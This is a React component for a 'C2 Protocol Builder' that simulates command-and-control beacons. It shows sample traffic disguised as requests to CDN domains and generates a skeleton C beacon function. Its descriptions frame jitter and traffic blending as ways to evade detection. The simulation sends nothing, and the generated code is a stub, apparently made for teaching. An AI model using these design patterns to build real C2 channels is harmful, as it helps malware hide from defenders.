import React, { useState } from 'react';
import { Lock, Shuffle, Send, Settings, Eye, EyeOff } from 'lucide-react';
import { Button } from '@/components/UI/button';

interface ProtocolLayer {
    id: string;
    name: string;
    type: 'encryption' | 'encoding' | 'transport' | 'timing';
    options: string[];
    selected: string;
    icon: React.ElementType;
}

interface C2Traffic {
    id: number;
    direction: 'beacon' | 'command';
    raw: string;
    encrypted: string;
    encoded: string;
    final: string;
}

const C2ProtocolBuilder: React.FC = () => {
    const [layers, setLayers] = useState<ProtocolLayer[]>([
        {
            id: 'encryption',
            name: 'Encryption Layer',
            type: 'encryption',
            options: ['AES-256-GCM', 'ChaCha20-Poly1305', 'XOR', 'RC4', 'Custom'],
            selected: 'AES-256-GCM',
            icon: Lock
        },
        {
            id: 'encoding',
            name: 'Encoding Layer',
            type: 'encoding',
            options: ['Base64', 'Hex', 'Base64 + XOR', 'Custom Alphabet', 'None'],
            selected: 'Base64',
            icon: Shuffle
        },
        {
            id: 'transport',
            name: 'Transport Layer',
            type: 'transport',
            options: ['HTTPS', 'DNS', 'ICMP', 'SMB', 'WebSocket', 'Custom'],
            selected: 'HTTPS',
            icon: Send
        },
        {
            id: 'timing',
            name: 'Timing Layer',
            type: 'timing',
            options: ['Fixed (60s)', 'Jitter (30-90s)', 'Random', 'Adaptive', 'Custom'],
            selected: 'Jitter (30-90s)',
            icon: Settings
        }
    ]);

    const [showDecrypted, setShowDecrypted] = useState(false);
    const [traffic, setTraffic] = useState<C2Traffic[]>([]);
    const [beaconCount, setBeaconCount] = useState(0);

    const updateLayer = (layerId: string, value: string) => {
        setLayers(prev => prev.map(layer =>
            layer.id === layerId ? { ...layer, selected: value } : layer
        ));
    };

    const simulateBeacon = () => {
        const newBeacon: C2Traffic = {
            id: beaconCount + 1,
            direction: 'beacon',
            raw: `{"hostname":"DESKTOP-${Math.random().toString(36).substr(2, 6).toUpperCase()}","user":"admin","os":"Windows 10","ip":"192.168.1.${Math.floor(Math.random() * 254) + 1}"}`,
            encrypted: '',
            encoded: '',
            final: ''
        };

        // Simulate encryption
        const encryption = layers.find(l => l.id === 'encryption')?.selected || 'AES-256-GCM';
        newBeacon.encrypted = `[${encryption}]` + btoa(newBeacon.raw).split('').reverse().join('');

        // Simulate encoding
        const encoding = layers.find(l => l.id === 'encoding')?.selected || 'Base64';
        newBeacon.encoded = `[${encoding}]` + btoa(newBeacon.encrypted);

        // Simulate transport
        const transport = layers.find(l => l.id === 'transport')?.selected || 'HTTPS';
        if (transport === 'HTTPS') {
            newBeacon.final = `POST /api/v1/update HTTP/1.1\nHost: cdn.cloudfront.net\nContent-Type: application/json\n\n${newBeacon.encoded}`;
        } else if (transport === 'DNS') {
            newBeacon.final = `${newBeacon.encoded.substr(0, 32)}.update.cloudflare.com`;
        } else {
            newBeacon.final = newBeacon.encoded;
        }

        setTraffic(prev => [newBeacon, ...prev].slice(0, 10));
        setBeaconCount(prev => prev + 1);
    };

    const generateCode = () => {
        const encryption = layers.find(l => l.id === 'encryption')?.selected;
        const encoding = layers.find(l => l.id === 'encoding')?.selected;
        const transport = layers.find(l => l.id === 'transport')?.selected;
        const timing = layers.find(l => l.id === 'timing')?.selected;

        return `// C2 Beacon Configuration
#define ENCRYPTION "${encryption}"
#define ENCODING "${encoding}"
#define TRANSPORT "${transport}"
#define TIMING "${timing}"

// Beacon function
void beacon() {
    // Collect system info
    char* data = collect_sysinfo();
    
    // Encrypt
    char* encrypted = encrypt_${encryption.toLowerCase().replace(/[^a-z0-9]/g, '_')}(data);
    
    // Encode
    char* encoded = encode_${encoding.toLowerCase().replace(/[^a-z0-9]/g, '_')}(encrypted);
    
    // Send via ${transport}
    send_${transport.toLowerCase()}(encoded, "cdn.cloudfront.net");
    
    // Sleep with jitter
    sleep_with_jitter(${timing.includes('Jitter') ? '30, 90' : '60'});
}`;
    };

    const layerColors = {
        encryption: '#ef4444',
        encoding: '#f59e0b',
        transport: '#10b981',
        timing: '#3b82f6'
    };

    return (
        <div className="w-full max-w-7xl mx-auto space-y-6">
            {/* Header */}
            <div className="text-center space-y-2">
                <h2 className="text-3xl font-bold">C2 Protocol Builder</h2>
                <p className="text-muted-foreground">Design custom Command & Control protocols</p>
            </div>

            {/* Protocol Layers */}
            <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4">
                {layers.map((layer) => {
                    const Icon = layer.icon;
                    return (
                        <div
                            key={layer.id}
                            className="border rounded-lg p-4"
                            style={{ borderColor: `${layerColors[layer.type]}40` }}
                        >
                            <div className="flex items-center gap-2 mb-3">
                                <Icon className="h-5 w-5" style={{ color: layerColors[layer.type] }} />
                                <h3 className="font-semibold text-sm">{layer.name}</h3>
                            </div>
                            <select
                                value={layer.selected}
                                onChange={(e) => updateLayer(layer.id, e.target.value)}
                                className="w-full px-3 py-2 bg-background border border-border rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                            >
                                {layer.options.map(option => (
                                    <option key={option} value={option}>{option}</option>
                                ))}
                            </select>
                        </div>
                    );
                })}
            </div>

            {/* Protocol Stack Visualization */}
            <div className="border border-border rounded-lg p-6">
                <h3 className="font-semibold mb-4">Protocol Stack</h3>
                <div className="space-y-2">
                    {layers.map((layer, index) => (
                        <div
                            key={layer.id}
                            className="flex items-center gap-3 p-3 rounded-lg"
                            style={{ backgroundColor: `${layerColors[layer.type]}10` }}
                        >
                            <div className="text-2xl font-bold text-muted-foreground">{index + 1}</div>
                            <div className="flex-1">
                                <div className="font-semibold text-sm">{layer.name}</div>
                                <div className="text-xs text-muted-foreground">{layer.selected}</div>
                            </div>
                            <div
                                className="w-3 h-3 rounded-full"
                                style={{ backgroundColor: layerColors[layer.type] }}
                            ></div>
                        </div>
                    ))}
                </div>
            </div>

            {/* Actions */}
            <div className="flex justify-center gap-4">
                <Button onClick={simulateBeacon} className="flex items-center gap-2">
                    <Send className="h-4 w-4" />
                    Simulate Beacon
                </Button>
                <Button
                    onClick={() => setShowDecrypted(!showDecrypted)}
                    variant="outline"
                    className="flex items-center gap-2"
                >
                    {showDecrypted ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    {showDecrypted ? 'Hide' : 'Show'} Decrypted
                </Button>
            </div>

            {/* Traffic Log */}
            {traffic.length > 0 && (
                <div className="border border-border rounded-lg overflow-hidden">
                    <div className="bg-secondary/30 px-4 py-2 text-sm font-semibold">
                        C2 Traffic Log ({traffic.length} beacons)
                    </div>
                    <div className="max-h-96 overflow-y-auto">
                        {traffic.map((item) => (
                            <div key={item.id} className="border-b border-border p-4 space-y-2">
                                <div className="flex items-center justify-between">
                                    <span className="text-xs font-semibold text-blue-500">
                                        BEACON #{item.id}
                                    </span>
                                    <span className="text-xs text-muted-foreground">
                                        {new Date().toLocaleTimeString()}
                                    </span>
                                </div>

                                {showDecrypted && (
                                    <div className="space-y-1">
                                        <div className="text-xs text-muted-foreground">Raw Data:</div>
                                        <pre className="text-xs bg-green-500/10 text-green-500 p-2 rounded overflow-x-auto">
                                            {item.raw}
                                        </pre>
                                    </div>
                                )}

                                <div className="space-y-1">
                                    <div className="text-xs text-muted-foreground">Encrypted & Encoded:</div>
                                    <pre className="text-xs bg-secondary p-2 rounded overflow-x-auto font-mono">
                                        {item.final.length > 200 ? item.final.substr(0, 200) + '...' : item.final}
                                    </pre>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* Generated Code */}
            <div className="border border-border rounded-lg overflow-hidden">
                <div className="bg-secondary/30 px-4 py-2 text-sm font-semibold flex items-center justify-between">
                    <span>Generated C2 Client Code</span>
                    <Button
                        size="sm"
                        variant="ghost"
                        onClick={() => navigator.clipboard.writeText(generateCode())}
                    >
                        Copy
                    </Button>
                </div>
                <pre className="p-4 text-xs font-mono bg-black/50 text-green-400 overflow-x-auto">
                    {generateCode()}
                </pre>
            </div>

            {/* Protocol Features */}
            <div className="grid md:grid-cols-3 gap-4">
                <div className="border border-border rounded-lg p-4">
                    <h4 className="font-semibold text-sm mb-2">🔒 Encryption</h4>
                    <p className="text-xs text-muted-foreground">
                        Strong encryption prevents traffic inspection and protects C2 communications.
                    </p>
                </div>
                <div className="border border-border rounded-lg p-4">
                    <h4 className="font-semibold text-sm mb-2">🌐 Transport</h4>
                    <p className="text-xs text-muted-foreground">
                        Blend with legitimate traffic using HTTPS, DNS, or custom protocols.
                    </p>
                </div>
                <div className="border border-border rounded-lg p-4">
                    <h4 className="font-semibold text-sm mb-2">⏱️ Timing</h4>
                    <p className="text-xs text-muted-foreground">
                        Jitter and adaptive timing evade network anomaly detection.
                    </p>
                </div>
            </div>
        </div>
    );
};

export default C2ProtocolBuilder;
